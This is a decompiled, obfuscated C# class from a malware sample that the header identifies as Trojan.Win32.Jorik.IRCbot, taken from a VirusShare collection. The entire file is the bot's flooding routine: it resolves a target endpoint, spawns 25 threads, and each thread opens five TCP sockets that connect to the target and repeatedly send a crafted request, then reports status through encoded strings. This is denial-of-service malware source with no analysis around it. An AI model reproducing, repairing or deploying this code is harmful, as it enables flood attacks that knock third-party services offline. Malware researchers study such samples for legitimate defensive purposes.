// Decompiled with JetBrains decompiler
// Type: .
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=24b8f1c2e28acde2
// MVID: 0C7B899D-7035-4B2D-B433-3C80E566FC1C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Jorik.IRCbot.gim-3e8d8a98ac44098acc3d92301b4ae92e5e6e1a5f0b2d861cd9e69e0650edce63.exe

using \u0004;
using \u000E;
using \u000F;
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace \u0004
{
  internal sealed class \u0001
  {
    public static string \u0001;
    public static int \u0001;
    public static int \u0002;
    public static int \u0003;
    public static int \u0004;
    private static IPEndPoint \u0001;
    private static ThreadStart[] \u0001;
    private static Thread[] \u0001;
    public static bool \u0001;
    [NonSerialized]
    internal static \u0008.\u0004 \u0097;

    public static void \u0001()
    {
      Thread thread1 = new Thread(new ThreadStart(\u0001.\u0002));
      if (true)
        goto label_2;
label_1:
      Thread thread2;
      \u0084.\u007E\u0094\u0002((object) thread2, true);
      \u0013.\u007E\u0002\u0002((object) thread2);
      return;
label_2:
      thread2 = thread1;
      goto label_1;
    }

    private static void \u0002()
    {
      try
      {
        \u0001.\u0001 = new IPEndPoint(\u0087.\u007E\u009F\u0002((object) \u0086.\u009D\u0002(\u0001.\u0001))[0], \u0001.\u0001);
      }
      catch
      {
        \u0001.\u0001 = new IPEndPoint(\u0088.\u0001\u0003(\u0001.\u0001), \u0001.\u0001);
      }
      \u0001.\u0001 = new Thread[\u0001.\u0003];
      \u0001.\u0001 = new ThreadStart[\u0001.\u0003];
      for (int index = 0; index < \u0001.\u0003; ++index)
      {
        \u0001.\u0001[index] = new ThreadStart(\u0001.\u0004);
        \u0001.\u0001[index] = new Thread(\u0001.\u0001[index]);
        \u0013.\u007E\u0002\u0002((object) \u0001.\u0001[index]);
      }
      \u001F.\u0087\u0002(\u0001.\u0002 * 1000);
      if (!\u0001.\u0001)
        return;
      \u0001.\u0003();
      string[] strArray = new string[5]
      {
        \u0001.\u0097(1055),
        \u0002.\u0001(\u0010.\u008D(\u0001.\u0097(548), \u0001.\u0001)),
        \u0001.\u0097(867),
        \u0002.\u0001(\u0089.\u0002\u0003((object) \u0001.\u0097(548), (object) \u0001.\u0002)),
        \u0001.\u0097(876)
      };
      \u0002.\u0001(\u0018.\u001A\u0002(strArray), \u0001.\u0010);
    }

    public static void \u0003() => \u0001.\u0001 = false;

    private static void \u0004()
    {
      try
      {
        string str1 = \u0001.\u0097(1076);
        string str2 = \u008A.\u0003\u0003(str1, (object) \u0001.\u0001, (object) \u0001.\u0097(1173));
        byte[] numArray;
        Socket[] socketArray1;
        int index1;
        if (true)
        {
          numArray = \u0081.\u007E\u008F\u0002((object) \u0080.\u008A\u0002(), str2);
          socketArray1 = new Socket[\u0001.\u0004];
          index1 = 0;
          goto label_5;
        }
        else
          goto label_20;
label_4:
        ++index1;
label_5:
        int num1 = index1;
        int num2 = \u0001.\u0004;
label_6:
        if (num1 < num2)
        {
          socketArray1[index1] = new Socket(\u008B.\u007E\u0004\u0003((object) \u0001.\u0001), SocketType.Stream, ProtocolType.Tcp);
          goto label_4;
        }
        else
          goto label_21;
label_20:
        \u001F.\u0087\u0002(1);
label_21:
        Socket[] socketArray2;
        if (\u0001.\u0001)
          socketArray2 = socketArray1;
        else
          goto label_22;
label_8:
        int index2 = 0;
        if (false)
          goto label_4;
        else
          goto label_18;
label_17:
        int num3;
        index2 = num3 + 1;
label_18:
        int num4 = index2;
        int length1 = socketArray2.Length;
        if (false)
        {
          num2 = length1;
          num1 = num4;
          goto label_6;
        }
        else
        {
          int num5 = length1;
          if (num4 < num5)
          {
            Socket socket = socketArray2[index2];
            if (true)
            {
              if (!\u008C.\u007E\u0006\u0003((object) socket))
              {
                try
                {
                  \u008E.\u007E\u0013\u0003((object) socket, \u008D.\u007E\u0012\u0003((object) \u0001.\u0001), \u0001.\u0001);
                }
                catch
                {
                }
              }
              else
              {
                try
                {
                  int num6 = \u008F.\u007E\u0014\u0003((object) socket, numArray, numArray.Length, SocketFlags.None);
                }
                catch
                {
                }
              }
              num3 = index2;
              goto label_17;
            }
            else
              goto label_8;
          }
          else
            goto label_20;
        }
label_22:
        Socket[] socketArray3 = socketArray1;
        int index3;
        if (true)
        {
          index3 = 0;
          goto label_27;
        }
label_25:
        if (true)
          ++index3;
        else
          goto label_22;
label_27:
        int num7 = index3;
        if (false)
        {
          num3 = num7;
          goto label_17;
        }
        else
        {
          int length2 = socketArray3.Length;
          if (num7 >= length2)
            return;
          Socket socket = socketArray3[index3];
          \u0090.\u007E\u0016\u0003((object) socket, SocketShutdown.Both);
          \u0013.\u007E\u0003\u0002((object) socket);
          goto label_25;
        }
      }
      catch
      {
      }
    }

    static \u0001()
    {
      \u0005.\u0001(typeof (\u0001));
      \u0001.\u0003 = 25;
      \u0001.\u0004 = 5;
      \u0001.\u0001 = false;
    }
  }
}
